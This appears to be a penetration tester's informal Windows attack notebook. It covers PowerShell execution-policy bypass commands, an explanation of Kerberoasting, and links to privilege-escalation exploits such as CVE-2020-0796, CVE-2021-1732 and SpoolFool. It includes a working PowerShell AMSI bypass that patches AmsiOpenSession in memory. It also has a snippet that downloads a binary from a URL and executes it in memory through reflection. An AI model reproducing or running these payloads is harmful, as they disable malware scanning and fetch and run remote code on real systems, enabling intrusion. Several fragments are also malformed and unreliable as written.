# Execution policy bypass

powershell - ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"

Import-Module 
Get-Command -Module 

![](20220801163041.png) 

# kerberoasting

In such an attack, an adversary masquerading as an account user with a service principal name (SPN) requests a ticket, which contains an encrypted password, or Kerberos. (An SPN is an attribute that ties a service to a user account within the AD). The adversary then works offline to crack the password hash, often using brute force techniques.

What is a Kerberoasting attack?
Kerberoasting is a post-exploitation attack technique that attempts to crack the password of a service account within the Active Directory (AD).


How do Kerberoasting attacks work?
Kerberoasting attacks exploit a combination of weak encryption techniques and insecure or low-quality passwords. These attacks typically follow the below process:

An attacker who has already compromised the account of a domain user authenticates the account and launches a new session.
The attacker, who appears to be a valid domain user, requests a Kerberos service ticket from the ticket granting service (TGS) using tools like GhostPack’s Rubeus or SecureAuth Corporation’s GetUserSPNs.py.
The adversary receives a ticket from the Kerberos key distribution center (KDC). The ticket contains a hashed version of the account’s password, or Kerberos.
The adversary captures the TGS ticket and Kerberos from memory and takes it offline.
The hacker attempts to crack the SPN value or service credential hash to obtain the service account’s plaintext password using brute force techniques or tools like Hashcat or JohnTheRipper.
With the service account password in hand, the adversary attempts to log in to the service account and is granted access to any service, network or system associated with the compromised account.
The attacker is then able to steal data, escalate privileges or set backdoors on the network to ensure future access.

# for privilege escalation

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


# trying https://github.com/danigargu/CVE-2020-0796.git

exe hosted 

```powershell
function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType {
 Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
 $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed') 
 return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], 
[UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

```
# https://github.com/exploitblizzard/Windows-Privilege-Escalation-CVE-2021-1732.git



```powershell
$bytes = (Invoke-WebRequest "http://example.com/path/to/binary.exe" ).Content
$bytes = [System.Convert]::FromBase64String($string)
$assembly = [System.Reflection.Assembly]::Load($bytes)

$entryPointMethod = 
 $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').
   GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')

# Now you can call the entry point.
# This example passes two arguments, 'foo' and 'bar'
$entryPointMethod.Invoke($null, (, [string[]] ('foo', 'bar')))
```

# https://github.com/ly4k/SpoolFool

works on 1803 

can we define different Adduser and binary 

we can run with powershell

spoolfool




can we uninstall a security update through command line 

